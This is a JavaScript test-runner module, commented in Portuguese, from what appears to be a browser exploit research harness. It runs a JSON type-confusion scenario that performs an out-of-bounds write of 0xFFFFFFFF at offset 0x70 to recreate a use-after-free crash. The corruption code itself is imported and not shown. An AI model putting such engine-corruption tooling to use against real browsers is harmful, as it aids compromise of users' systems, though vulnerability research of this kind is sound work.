// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import { runSpecificJsonTypeConfusionTest } from './testJsonTypeConfusionUAFSpeculative.mjs';
// Adicione outras importações de teste do script3 se necessário
// import { testWebAssemblyInterface } from './testWebAssemblyInterface.mjs';
// ...

async function runFocusedTests_DetectEarlyCorruption() {
    const FNAME_RUNNER = "runFocusedTests_DetectEarlyCorruption";
    logS3(`==== INICIANDO TESTES DIRECIONADOS JSON TC (Detectar Corrupção Cedo) ====`, 'test', FNAME_RUNNER);

    // Cenário 1: OOB write de 0xFFFFFFFF em 0x70 + PP com toJSON simples e logging detalhado.
    // Tentar recriar o crash original UAF/Type Confusion.
    await runSpecificJsonTypeConfusionTest(
        "Focus_OOB_0x70_FFFF_PP_SimpleToJSON_DetailLog",
        0x70,       // corruptionOffset
        0xFFFFFFFF, // valueToWrite
        false,       // enablePP
        true,       // attemptOOBWrite
        false       // skipOOBEnvironmentSetup (configura ambiente OOB)
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
      // OPCIONAL: Cenário de controle - Apenas PP (sem escrita OOB), com toJSON simples.
    // Este cenário provavelmente causará o RangeError (estouro de pilha) ou lentidão extrema.
    // logS3("Próximo teste de CONTROLE: APENAS PP com toJSON simples. ESPERADO: RangeError ou lentidão.", "warn", FNAME_RUNNER);
    // await runSpecificJsonTypeConfusionTest(
    //     "CONTROL_OnlyPP_SimpleToJSON_NoOOB_DetailLog",
    //     -1,         // corruptionOffset (inválido -> sem escrita OOB efetiva)
    //     0,          // valueToWrite (irrelevante)
    //     true,       // enablePP
    //     false,      // attemptOOBWrite (explicitamente desabilitado)
    //     false       // skipOOBEnvironmentSetup (ambiente OOB é configurado, mas não usado para escrita)
    // );
    // await PAUSE_S3(MEDIUM_PAUSE_S3);


    logS3(`==== TESTES DIRECIONADOS JSON TC (Detectar Corrupção Cedo) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_FocusEarlyCorruption';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Foco JSON TC (Detectar Corrupção Cedo) ====`,'test', FNAME);
    
    await runFocusedTests_DetectEarlyCorruption();

    // Outros testes do Script 3 podem ser adicionados ou descomentados aqui se necessário
    // logS3("Outros testes do Script 3 (se houver) seriam executados agora...", "info", FNAME);

    logS3(`\n==== Script 3 CONCLUÍDO (Foco JSON TC com Detecção Cedo) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
